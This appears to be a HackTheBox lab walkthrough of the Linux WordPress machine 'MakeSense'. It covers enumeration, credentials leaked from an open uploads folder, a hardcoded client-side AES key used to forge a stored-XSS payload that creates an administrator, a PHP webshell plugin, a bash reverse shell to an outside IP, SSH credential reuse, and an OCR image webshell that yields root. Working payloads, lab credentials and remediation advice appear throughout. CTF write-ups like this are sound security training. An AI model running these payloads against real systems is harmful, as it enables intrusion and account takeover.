---
title: "Owning MakeSense — From a Public Uploads Folder to Root"
date: 2026-11-15
platform: htb
slug: makesense
os: Linux
difficulty: Medium
target: makesense.htb
ip: 10.129.246.24
read_time: "~12 min read"
tags: [wordpress, stored-xss, rce, privesc]
excerpt_text: "An open uploads folder leaks a voicemail with creds; a hardcoded client-side AES key lets me forge a stored-XSS payload into admin, then plugin RCE, credential reuse, and an OCR image-webshell to root."
description: "HackTheBox MakeSense walkthrough — open uploads folder, leaked voicemail, hardcoded AES key, forged stored XSS to admin, plugin RCE, credential reuse, and an OCR image webshell to root."
---

A walkthrough of a Linux target running WordPress, taken from an unauthenticated network position all the way to a root shell. The point of this writeup isn't just what commands I ran — it's the methodology: enumerate everything first, let each decision be driven by a confirmed fact, and only then exploit. The interesting part of this box is that the foothold doesn't come from a plugin CVE — it comes from a browser-side "AI voice assistant" that ships its own encryption key, so the client is trusted and any payload can be forged.

> **Lab / authorized target.** Everything below was performed against a HackTheBox machine I was explicitly authorized to test. Target: makesense.htb (10.129.246.24).

**Attack path at a glance**

```text
nmap → WordPress enum (wpscan) → open uploads dir (voicemail → jake)
  → source review (hardcoded AES key) → forged payload = stored XSS
  → admin CSRF (new admin) → malicious plugin = RCE (www-data)
  → wp-config creds reuse (walter → SSH → user.txt)
  → internal OCR service → image webshell → ROOT
```

## Methodology

I follow a fixed order so nothing gets skipped and no step is based on a guess:

1. **Reconnaissance** — map every open port and service.
2. **Enumeration** — dig into each service; start with the largest attack surface.
3. **Fingerprinting** — identify the exact product and version before touching any exploit.
4. **Gaining Access** — get the first foothold.
5. **Lateral Movement & Proof** — reuse what the box leaks to become a real user.
6. **Privilege Escalation** — turn a local service into root.

## 1. Reconnaissance

Start by discovering what's actually running on the host:

```bash
nmap -Pn -sV -sC 10.129.246.24
```

SSH (22) and HTTP/HTTPS are open, and the web server redirects to a hostname. Add it to the hosts file so name-based routing works:

```bash
echo "10.129.196.131 makesense.htb" | sudo tee -a /etc/hosts
```

<div class="shot">nmap -sV -sC output and the /etc/hosts entry.</div>

## 2. Enumeration

### 2.1 Web — the priority

Directory brute force first:

```bash
feroxbuster -k -u https://makesense.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The results are a textbook WordPress layout — `wp-content`, `wp-admin`, `wp-includes`, `xmlrpc.php` — plus a custom `webagency` theme. The host is no longer an anonymous server; it's a known application, and every step after this is targeted.

<div class="shot">feroxbuster hits showing the wp-* directories.</div>

### 2.2 Fingerprinting — never skip this

Before choosing any angle, confirm exactly what WordPress is running:

```bash
wpscan --url https://makesense.htb --disable-tls-checks -v
```

Key findings:

- WordPress 7.0
- Theme in use: `webagency`
- XML-RPC enabled (`/xmlrpc.php`)
- Upload directory listing enabled at `/wp-content/uploads/`

That last line is the opening — a misconfiguration, not a CVE.

<div class="shot">wpscan output highlighting the version, theme, and "Upload directory has listing enabled".</div>

### 2.3 User enumeration

The REST API happily lists users:

```bash
curl -k -s "https://makesense.htb/index.php?rest_route=/wp/v2/users" | jq
```

We get `admin`, whose `url` field points to `http://localhost:8000` — a hint that something is bound locally that we'll care about later. XML-RPC also answers `system.listMethods`, confirming the pingback and `wp.*`/`metaWeblog.*` method set is live — worth noting, but the real lead is the open uploads folder.

<div class="shot">the REST API users response showing admin and the localhost:8000 url.</div>

## 3. Gaining Access

### 3.1 The exposed voice message

Because upload listing is enabled, I just browse the uploads folder by month:

```bash
for m in 01 05 06 07 11; do
  echo "=== /wp-content/uploads/2026/$m/ ==="
  curl -k -s "https://makesense.htb/wp-content/uploads/2026/$m/" \
    | grep -oE 'href="[^"?]+"' | grep -vE '/(icons|parent|uploads)'
done
```

Under `/wp-content/uploads/2026/` there's a `voice-message.wav`. Download it and listen — the recording reads out a set of credentials:

```text
jake : ClearLightNiceSmooth4923
```

Those log straight into `wp-admin`.

<div class="shot">the uploads directory listing with voice-message.wav, and the wp-admin dashboard as jake.</div>

### 3.2 Reading the theme source — the real vulnerability

Logged in as jake, the interesting feature is the theme's voice assistant. Pull the JavaScript:

```bash
curl -k https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

Two things jump out. First, a hardcoded symmetric key:

```js
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The client transcribes your voice, summarizes it, then AES-GCM encrypts a `{ transcription, summary }` payload with a key derived from this string (SHA-256) and POSTs it to `admin-ajax.php` with `action=save_voice_results`. Because the key lives in the client, we can encrypt anything we want and the server will accept it as genuine.

Second, a "spoken symbols" mapping:

```js
applySymbolMapping(text) {
  const mappings = {
    'open bracket': '<',
    'close bracket': '>',
    'slash': '/',
    'quote': "'",
    // ...
  };
}
```

The transcript is post-processed so spoken words become symbols — "open bracket script close bracket" becomes `<script>`. The feature is literally designed to turn dictated text into HTML, and the stored result is later rendered in the admin panel. That is stored XSS by design — and with the encryption key in hand, we don't even need to speak it.

### 3.3 Forging the payload → stored XSS → admin CSRF

The plan: forge an encrypted `save_voice_results` payload whose "summary" is a `<script>` that runs in the admin's session when they review the submission. The script grabs the create-user nonce and adds a new administrator.

First get a valid `post_id` and a nonce:

```bash
NONCE=$(curl -k -s https://makesense.htb/ | grep -oP 'nonce":"\K[a-f0-9]+' | head -1)
RESP=$(curl -k -s -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -d "action=submit_contact_form" -d "nonce=$NONCE" \
  -d "name=test" -d "email=t@t.com" -d "phone=1" -d "message=csrf")
POST_ID=$(echo "$RESP" | grep -oP '"post_id":\K[0-9]+')
```

The XSS payload, carried inside the encrypted blob, creates an admin user:

```html
<script>
(async () => {
  const r = await fetch("/wp-admin/user-new.php", {credentials:"include"});
  const html = await r.text();
  const m = html.match(/name="_wpnonce_create-user" value="([^"]+)"/);
  if (!m) return;
  const fd = new FormData();
  fd.append("action","createuser");
  fd.append("_wpnonce_create-user", m[1]);
  fd.append("_wp_http_referer","/wp-admin/user-new.php");
  fd.append("user_login","pwned123");
  fd.append("email","pwned123@test.com");
  fd.append("pass1","Pwn3d!Pass2026");
  fd.append("pass2","Pwn3d!Pass2026");
  fd.append("role","administrator");
  fd.append("createuser","Add New User");
  await fetch("/wp-admin/user-new.php", {method:"POST", body: fd, credentials:"include"});
})();
</script>
```

Encrypt it with the leaked key (a short script that SHA-256s `ENCRYPTION_KEY`, AES-GCM encrypts, prepends the 12-byte IV, and base64-encodes), then submit it as the voice result:

```bash
ENC=$(python3 ~/forge_payload.py "$PAYLOAD" "csrf")
curl -k -s -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_results" -F "nonce=$NONCE" \
  -F "post_id=$POST_ID" -F "encrypted_payload=$ENC"
```

Keep a listener running for the callback, give the admin review bot 60–90 seconds, and the `pwned123` administrator now exists.

<div class="shot">the forged payload being submitted and the callback / new admin user in the Users list.</div>

### 3.4 Admin → RCE via malicious plugin

Log in as the new admin and build a one-file plugin that executes commands:

```php
<?php
/**
 * Plugin Name: Pwned
 * Description: pwned
 * Version: 1.0
 */
if (isset($_GET['c'])) { echo '<pre>' . shell_exec($_GET['c']) . '</pre>'; }
```

Zip it and upload through **Plugins → Add New → Upload Plugin**. (The scripted upload fought me on the nonce, so the browser UI was the path of least resistance.) Activate it, then hit the webshell:

```bash
curl -k -s "https://makesense.htb/wp-content/plugins/pwned/pwned.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A reverse shell makes it comfortable:

```bash
curl -k -s "https://makesense.htb/wp-content/plugins/pwned/pwned.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.17.244/4444%200>%261'"
```

<div class="shot">id returning www-data and the reverse shell catching on the listener.</div>

## 4. Lateral Movement & Proof

Loot the WordPress config for database credentials:

```bash
grep -E 'DB_USER|DB_PASSWORD|DB_NAME' /var/www/html/wp-config.php
```

The DB password is reused by a real system user — check `/etc/passwd` for accounts with shells and `walter` turns up:

```text
User:     walter
Password: JbhHDAEgXvri3!
```

SSH is open and the password is reused:

```bash
ssh walter@10.129.196.131
cat /home/walter/user.txt
```

`user.txt` is done. ✅

<div class="shot">wp-config.php creds, /etc/passwd, and the SSH session reading user.txt.</div>

## 5. Privilege Escalation — the OCR service

As walter there's an internal service bound to localhost on port 8001. Forward it so I can reach it locally:

```bash
ssh -L 8001:127.0.0.1:8001 walter@10.129.246.24
```

It's a web app that takes a canvas image, runs OCR on it, and saves the recognized text to a file whose name you control. If I can make OCR "read" PHP source and save it as a `.php` file in the web root, that's code execution as whatever user runs the service. So I render a PHP webshell *as an image* and let OCR transcribe it back into text:

```python
from PIL import Image, ImageDraw, ImageFont

PAYLOAD = '<?php system($_GET["c"]); ?>'
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 32)

dummy = Image.new('RGB', (1, 1))
d = ImageDraw.Draw(dummy)
bb = d.textbbox((0, 0), PAYLOAD, font=font)

img = Image.new('RGB', (bb[2]-bb[0]+40, bb[3]-bb[1]+40), 'white')
draw = ImageDraw.Draw(img)
draw.text((20-bb[0], 20-bb[1]), PAYLOAD, fill='black', font=font)
img.save('/tmp/shell.png')
```

Submit the image, grab the returned `ocr_id`, save it under a `.php` filename, and execute:

```bash
B64=$(base64 -w0 /tmp/shell.png)
AUTH=walter:JbhHDAEgXvri3!
JAR=/tmp/cookies.txt

OCR_ID=$(curl -s -c $JAR -b $JAR -u "$AUTH" -X POST http://localhost:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$B64" \
  | grep -oP 'ocr_id" value="\K[^"]+')

curl -s -c $JAR -b $JAR -u "$AUTH" -X POST http://localhost:8001/ \
  --data-urlencode "ocr_id=$OCR_ID" \
  --data-urlencode "filename=shell.php"

curl -s -u "$AUTH" "http://localhost:8001/saved/shell.php?c=id"
```

The service runs as root, so the webshell executes as root — read `root.txt` and the box is done. 🔓

<div class="shot">the OCR image, the saved shell.php, and id returning root.</div>

## 6. Remediation

- Never expose uploads directory listing — and never store secrets (like a voicemail with credentials) where listing can reach them.
- A "symmetric encryption key (must match server-side)" in client-side JavaScript means the client is trusted; move any real validation server-side and treat all client input as hostile.
- Don't auto-render user-submitted content into an admin panel without sanitization — a feature that turns dictated words into HTML is stored XSS waiting to happen.
- Don't reuse the web app's database password for a system/SSH account.
- Don't run internal services as root, and treat "OCR writes attacker-named file" as the file-write-to-RCE primitive it is.

## 7. Key Takeaways

- **Misconfigurations beat CVEs** — an open uploads folder leaked the first credentials before any exploit was involved.
- **If a secret ships to the browser, it's not a secret** — a client-side encryption key lets an attacker forge whatever the server trusts.
- **Credential reuse is the glue** — the same password bridged web RCE to a real shell.
- **A file write in a web root is RCE** — even when it arrives dressed up as optical character recognition.

Thanks for reading — feedback welcome.
